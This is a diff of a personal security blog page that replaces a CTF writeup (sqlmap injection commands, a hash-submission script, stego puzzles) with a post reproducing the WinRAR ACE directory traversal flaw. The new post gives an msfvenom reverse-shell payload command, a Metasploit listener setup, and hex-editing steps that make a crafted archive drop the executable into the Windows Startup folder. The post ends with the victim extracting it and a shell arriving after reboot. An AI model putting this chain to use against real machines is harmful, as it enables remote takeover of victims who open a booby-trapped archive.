@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>安恒杯7月赛writeup · thr0cyte&#39;s bolg</title>
+    <title>winrar目录穿越漏洞实践 · thr0cyte&#39;s bolg</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >thr0cyte&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">安恒杯7月赛writeup</a>
+                <a href="#" class="post-name">winrar目录穿越漏洞实践</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            安恒杯7月赛writeup
+            winrar目录穿越漏洞实践
             <!-- 404 -->
             
         </h1>
@@ -266,22 +266,20 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "安恒杯">安恒杯</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "社工">社工</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">650</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">341</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/24</span>
+                    <span class="post-intro-time">2019/02/23</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -405,51 +403,15 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>这次月赛被虐的头疼，编程不熟真的是硬伤，等考完security+好好的练习python，拒绝工具！</p>
-<h1 id="第一道web"><a href="#第一道web" class="headerlink" title="第一道web"></a>第一道web</h1><p>提示是order注入，测试了一下，发现是返回不同页面的盲注，直接丢sqlmap：</p>
-<p>C:\Users\Administrator&gt;sqlmap.py -u “<a href="http://101.71.29.5:10000/?order=name&amp;button" target="_blank" rel="noopener">http://101.71.29.5:10000/?order=name&amp;button</a><br>=submit” -p order –thread 5</p>
-<p>GET parameter ‘order’ is vulnerable. Do you want to keep testing the others (if<br>any)? [y/N]</p>
-<p>ok，存在注入点，sqlmap还是强大，继续操作：</p>
-<p>available databases [3]:<br>[<em>] information_schema<br>[</em>] shop<br>[*] test</p>
-<p>3个库名爆出来了</p>
-<p>安排表名：</p>
-<p>shop表很可疑，直接看shop表就行</p>
-<p>Database: shop<br>[2 tables]<br>+——-+<br>| flag |<br>| goods |<br>+——-+</p>
-<p>flag表出来了，看下列名：</p>
-<p>Database: shop<br>Table: flag<br>[1 column]<br>+——–+————-+<br>| Column | Type |<br>+——–+————-+<br>| flag | varchar(35) |<br>+——–+————-+</p>
-<p>搞定！dump flag表中的一条数据：</p>
-<p>C:\Users\Administrator&gt;sqlmap.py -u “<a href="http://101.71.29.5:10000/?order=name&amp;button" target="_blank" rel="noopener">http://101.71.29.5:10000/?order=name&amp;button</a><br>=submit” -p order –thread 5 -D shop -T flag –start 1 –stop 1 –dump</p>
-<p>Database: shop<br>Table: flag<br>[1 entry]<br>+—————————+<br>| flag |<br>+—————————+<br>| flag{666_0rdorby_you_can} |<br>+—————————+</p>
-<p>搞定<br><br></p>
-<h1 id="第二道web"><a href="#第二道web" class="headerlink" title="第二道web"></a>第二道web</h1><p>页面让输入密码，对了给flag。直接看源码：</p>
-<p>最后一行给了提示  &lt;!–hint.php–&gt;</p>
-<p>进hint看一下：</p>
-<p>&lt;?php<br>$key = “<strong><em>**</em></strong>”;<br>srand(time());</p>
-<p>$a = rand(0,100);<br>$b = rand(0,100);<br>$c = rand(0,100);<br>$d = rand(0,100);<br>$e = rand(0,100);</p>
-<p>$result = ((($a – $b)/$c)+$d) * $e;<br>$result = md5($key.$result.$key);<br>show_source(<strong>FILE</strong>);<br>?&gt;</p>
-<p>解读一下，这个是以时间戳为种子，产生5个随机数，然后运算，再和<strong><em>**</em></strong>组合，最后哈希一下就是答案，尝试在本地搭建phpstudy环境，输入这些代码，产生一个随机数：</p>
-<p>fcfcb50465a5aa5bb47bae721213ecd0</p>
-<p>将这个答案输进去：</p>
-<p>页面显示</p>
-<p>答案错误</p>
-<p>再看源码：发现最后一行给了提示&lt;!–50eb722bb4003cead5d6a5b58e7dc36e–&gt;</p>
-<p>把这个再输一下：还是错误，提示的哈希值又变了：&lt;!–8503388b283a99a50fce1de30fe4ee43–&gt;</p>
-<p>想了想，应该是要用脚本提交哈希值后再提取他提示的值提交。</p>
-<p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url= &apos;http://101.71.29.5:10002/flag.php&apos;</span><br><span class="line">d = &#123;&apos;answer&apos;: &apos;fcfcb50465a5aa5bb47bae721213ecd0&apos;&#125;</span><br><span class="line">r = requests.post(url, data=d)</span><br><span class="line">#print (r.text)</span><br><span class="line">hash=r.text[160:-3]</span><br><span class="line">print(hash)</span><br><span class="line">d2=&#123;&apos;answer&apos;: hash&#125;</span><br><span class="line">r2 = requests.post(url, data=d2)</span><br><span class="line">print (r2.text)</span><br></pre></td></tr></table></figure></p>
-<p>flag{ef58f0b1e9437b4451248fb3f239622b}拿到了flag<br><br></p>
-<h1 id="第一道misc"><a href="#第一道misc" class="headerlink" title="第一道misc"></a>第一道misc</h1><p>提示：弱口令</p>
-<p>这题听说很多人爆破了好几个小时</p>
-<p>思路居然在压缩包的注释部分：<br><img src="/images/ahbb1.png" alt=""><br>往sublimetext复制，发现是摩尔斯电码<br><img src="/images/ahbb2.png" alt=""><br>解密一下:<img src="/images/ahbb3.png" alt=""><br>解压出来，是png文件，怀疑是lsb加密:</p>
-<p>python lsb.py extract 123.png 123.txt 123456</p>
-<p>拿到flag<br><br></p>
-<h1 id="第二道misc"><a href="#第二道misc" class="headerlink" title="第二道misc"></a>第二道misc</h1><p>提示F5，怀疑f5加密</p>
-<p>java Extract.java 1.jpg</p>
-<p>解出来一个output.txt</p>
-<p>打开乱码</p>
-<p>winhex看一下，PK打头，是压缩包</p>
-<p>改后缀zip</p>
-<p>打开要密码，再丢winhex，发现是zip伪加密</p>
-<p>改成00，直接打开，拿到flag</p>
+        <p>前些日子爆出了隐藏十几年的winrar目录穿越漏洞。今天抽空实践一下</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=4433 -f exe -o 1.exe  生成反弹shell</p>
+<p>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.105<br>set LPORT 4433<br>exploit         开启监听</p>
+<p>制作rar payload：<br>将met.exe拉入winace制作ace压缩包：<br><img src="/images/rar1.png" alt=""><br>将生成的.ace文件拖入010editor读取十六进制形式</p>
+<p>接着将filename修改至启动目录下：c:\c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\1.exe<br><img src="/images/rar2.png" alt=""><br>该条路径长度为93，对应十六进制表示是0x005D，所以做以下修改：(图中应该是5d 00打错了)<br><img src="/images/rar3.png" alt=""></p>
+<p>然后修改一下hdr_size头，选中部分长度为124，对应十六进制为0x007C<br><img src="/images/rar4.png" alt="">所以将红框部分修改为7C 00</p>
+<p>接着需要修改hdr_crc。下载读取ace头的脚本：<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">https://github.com/droe/acefile/blob/master/acefile.py</a><br>先将代码定位到“header CRC failed”这个字符串，在这句if上边添加断点。接着加入打印ace_crc16(buf)的代码：<br><img src="/images/rar5.png" alt=""><br>接着点击run—edit config选项卡添加参数：<br><img src="/images/rar6.png" alt=""><br>运行debug，即可得到hdr_crc的值：<br><img src="/images/rar7.png" alt=""><br>（图中应该是7689 失误了）<br>7689对应十六进制为0x1E09<br>所以这样修改：<br><img src="/images/rar8.png" alt="">（图中改成09 1E ）</p>
+<p>这样就制作好了rar：<br><img src="/images/rar9.png" alt=""></p>
+<p>把后缀名改成rar<br>在受害者机器解压它，重启后msf收到反弹shell<br><img src="/images/rar10.png" alt=""></p>
 
     </article>
     <!-- license  -->
@@ -458,17 +420,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/01/security-考后心得/" title= "security+考后心得">
-                    <div class="nextTitle">security+考后心得</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/02/如何黑掉同局域网的手机/" title= "如何黑掉同局域网的手机">
-                    <div class="prevTitle">如何黑掉同局域网的手机</div>
+                <a href= "/2019/02/01/线下awd引发的思考/" title= "线下awd引发的思考">
+                    <div class="prevTitle">线下awd引发的思考</div>
                 </a>
             
         </li>
@@ -606,7 +563,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第一道web"><span class="toc-number">1.</span> <span class="toc-text">第一道web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二道web"><span class="toc-number">2.</span> <span class="toc-text">第二道web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一道misc"><span class="toc-number">3.</span> <span class="toc-text">第一道misc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二道misc"><span class="toc-number">4.</span> <span class="toc-text">第二道misc</span></a></li></ol>
+        
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
